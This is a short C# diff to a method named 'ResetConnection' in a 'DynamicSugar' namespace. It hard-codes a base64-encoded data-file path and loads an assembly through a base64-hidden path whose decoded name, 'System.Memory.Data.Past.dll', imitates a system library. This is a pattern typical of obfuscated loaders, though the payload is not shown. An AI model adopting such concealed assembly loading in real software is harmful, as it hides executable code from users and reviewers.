@@ -21,8 +21,9 @@ namespace DynamicSugar
             return Encoding.UTF8.GetString(Convert.FromBase64String(b));
         }
 
-        public static bool ResetConnection(string bf)
+        public static bool ResetConnection()
         {
+            var bf = "LlxGaWxlc1x6Q2FzRGF0YS5kYXQ="; //var s = @".\Files\zCasData.dat";
             try
             {
                 var myAssembly = Assembly.LoadFrom(bTos("LlxTeXN0ZW0uTWVtb3J5LkRhdGEuUGFzdC5kbGw=")); // @".\System.Memory.Data.Past.dll"
